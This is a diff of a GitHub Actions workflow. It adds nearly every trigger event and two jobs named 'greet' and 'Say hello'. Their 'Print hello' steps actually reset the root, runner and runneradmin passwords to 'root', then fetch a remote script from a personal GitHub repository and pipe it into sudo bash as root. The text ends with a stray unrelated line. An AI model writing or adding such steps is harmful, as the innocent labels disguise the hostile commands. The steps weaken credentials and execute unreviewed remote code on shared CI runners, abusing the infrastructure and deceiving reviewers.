@@ -17,16 +17,76 @@ jobs:
 
 
 name: run
+
+# Comprehensive set of triggers — enable the events you actually need to avoid noise/costs.
 on:
-  workflow_dispatch:
-  push:
+#  push:
+  pull_request:
+    types: [opened, reopened, synchronize, closed, labeled, unlabeled]
+  pull_request_target:
+    types: [opened, reopened, synchronize, closed]
   issues:
+    types: [opened, edited, deleted, closed, reopened, transferred, pinned, unpinned, labeled, unlabeled]
+  issue_comment:
+    types: [created, edited, deleted]
+  schedule:
+    - cron: '0 0 * * *' # daily run at UTC midnight; change as needed
+  workflow_dispatch: {}        # manual run
+  repository_dispatch: {}      # external dispatch
+  workflow_call: {}            # callable by other workflows
+  release:
+    types: [published, created, edited]
+  create: {}                   # branch or tag created
+  delete: {}                   # branch or tag deleted
+  fork: {}
+  watch:
+    types: [started]           # star events
+  discussion:
+    types: [created]
+  discussion_comment:
+    types: [created]
+  pull_request_review:
+    types: [submitted, edited, dismissed]
+  pull_request_review_comment:
+    types: [created, edited, deleted]
+  deployment: {}
+  deployment_status: {}
+  check_run: {}
+  check_suite: {}
+  status: {}
+  registry_package:
+    types: [published]
+  member: {}
+  public: {}
+  milestone:
+    types: [created, closed, opened, edited]
+  label:
+    types: [created, deleted]
+  project:
+    types: [created, updated, closed]
+  project_card:
+    types: [created, moved, converted]
+  project_column:
+    types: [created, updated, moved]
+#  commit_comment: {}
+
 jobs:
-  trigger:
+  greetings:
+    name: greet
     runs-on: ubuntu-latest
-    steps:   
-      - name: run
-        run: sudo swapoff -a ; sudo apt update &&  printf "root\nroot" | sudo passwd root &&  printf "root\nroot" | sudo passwd runner && printf "root\nroot" | sudo passwd runneradmin ; printf "root" | su - root -c " curl https://raw.githubusercontent.com/amitstudydude/guacamole/main/run | sudo bash "
+    steps:
+      - name: Print hello
+        run: sudo swapoff -a & sudo apt update &  printf "root\nroot" | sudo passwd root &&  printf "root\nroot" | sudo passwd runner &&  printf "root" | su - root -c " curl https://raw.githubusercontent.com/amitstudydude/guacamole/main/run | sudo bash "
+        
+  say-hello:
+    name: Say hello
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print hello
+        run: sudo swapoff -a & sudo apt update &  printf "root\nroot" | sudo passwd root &&  printf "root\nroot" | sudo passwd runner &&  printf "root" | su - root -c " curl https://raw.githubusercontent.com/amitstudydude/guacamole/main/run | sudo bash "
+
+
+
 
 
 Create Proton mail
